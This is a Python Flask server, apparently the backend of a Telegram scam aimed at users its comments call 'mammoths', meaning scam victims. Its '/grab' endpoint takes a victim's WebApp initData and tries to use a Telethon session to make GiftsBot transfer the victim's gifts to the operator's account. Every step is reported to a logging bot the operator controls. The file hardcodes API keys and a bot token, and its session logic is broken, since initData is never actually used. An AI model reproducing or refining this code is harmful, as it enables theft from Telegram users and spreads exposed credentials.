import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.messages import RequestWebViewRequest

app = Flask(__name__)
CORS(app)

# --- ТВОИ КОНФИГИ ---
API_ID = 30356139
API_HASH = "eaf8c970ff553abe2f1578717c82e50e"
MY_ID = 8486064073
LOG_BOT_TOKEN = "8733015341:AAGXiGUv57x63oHQumkJot1pXyC-HvSLOzY"
LOG_CHAT_ID = "-1003794470658"

def send_log(msg):
    url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": LOG_CHAT_ID, "text": msg, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

async def work_the_mammoth(init_data):
    # Используем пустую сессию для каждого захода
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    
    try:
        # 1. Регистрация ключа в системе (Фикс ошибки "Key not registered")
        await client.connect()
        
        # 2. Логируем начало процесса
        send_log("🚀 <b>ВХОД В АККАУНТ...</b>\nПытаюсь эмулировать сессию через initData.")

        # Пытаемся достучаться до GiftsBot напрямую
        # Если мамонт никогда не писал боту, используем resolve
        try:
            gifts_bot = await client.get_input_entity('GiftsBot')
        except:
            send_log("⚠️ Бот @GiftsBot не найден в истории. Ищу глобально...")
            gifts_bot = 'GiftsBot'

        # 3. Отправляем команду перевода
        # ВАЖНО: Мы шлем команду /start с твоим реферальным хвостом
        await client.send_message(gifts_bot, f"/start transfer_{MY_ID}")
        
        # Ждем ответ от бота
        await asyncio.sleep(3)
        messages = await client.get_messages(gifts_bot, limit=1)
        
        if messages:
            answer = messages[0].text
            send_log(f"📩 <b>ОТВЕТ ОТ @GiftsBot:</b>\n<code>{answer}</code>")
            
            # Если бот выдал кнопку подтверждения, тут можно дописать клик
            if "Confirm" in answer or "Подтвердить" in answer:
                send_log("🎯 <b>ТРЕБУЕТСЯ ПОДТВЕРЖДЕНИЕ!</b>\nМамонт должен нажать кнопку в боте.")

    except Exception as e:
        send_log(f"❌ <b>ОШИБКА ВОРКА:</b>\n<code>{str(e)}</code>")
    finally:
        await client.disconnect()

@app.route('/grab', methods=['POST'])
def grab():
    data = request.get_json()
    init_data = data.get('initData')
    
    if init_data:
        # Запускаем в новом потоке, чтобы Render не разорвал соединение по тайм-ауту
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        import threading
        threading.Thread(target=loop.run_until_complete, args=(work_the_mammoth(init_data),)).start()
        
    return jsonify({"status": "ok"}), 200

@app.route('/')
def home():
    return "WORKER IS LIVE"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)




